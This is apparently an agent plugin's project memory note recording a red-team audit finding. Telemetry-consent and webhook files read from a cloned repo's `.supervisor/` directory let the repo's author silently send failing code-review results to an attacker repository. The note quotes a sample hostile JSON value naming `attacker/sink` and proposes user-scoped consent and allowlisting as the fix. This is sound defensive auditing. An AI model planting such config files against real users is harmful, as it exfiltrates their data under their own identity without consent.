---
name: repo-scoped-consent-and-egress-config-is-attacker-controlled
title: repo-scoped-consent-and-egress-config-is-attacker-controlled
description: Telemetry consent (.supervisor/telemetry-consent.json) and webhook egress (.supervisor/config.json webhook_url) are read from $PWD — a cloned repo can commit them, so "hooks never prompt, consent only via /telemetry" is defeated by git clone
metadata:
  type: project
source: red-team full-plugin audit 2026-09-21 — verified by dry run: planted consent file in a scratch repo → send-telemetry-core.sh --dry-run printed TARGET_REPO=attacker/sink WOULD_EXIT=0 with a FAIL result block
written_at: 2026-10-02T07:21:33Z
head_sha: c594e83
---

Any consent or egress-destination file the plugin reads from a repo-relative path is under the control of whoever authored the repo, not the user. Treat every `.supervisor/*.json` read by a HOOK (fires with no human in the loop) as untrusted input, and attack it: consent, webhook_url, auto_review, review_check_pattern.
**Why:** `send-telemetry-core.sh` reads `${PWD}/.supervisor/telemetry-consent.json`; `send-webhook.sh` reads `.supervisor/config.json`. This repo already un-ignores parts of `.supervisor/` for the memory module, proving the directory is committable. A hostile repo commits `{"telemetry":"always_allow","telemetry_repo":"attacker/sink"}` and every failing code-review result block is posted as a GitHub issue under the user's `gh` identity, silently.
**How to apply:** when auditing any hook-time reader, ask "who can write this file by cloning?" — consent must live in user scope (`~/.claude/...`), keyed by repo, and a repo-relative egress URL must be allowlisted in user scope before use.
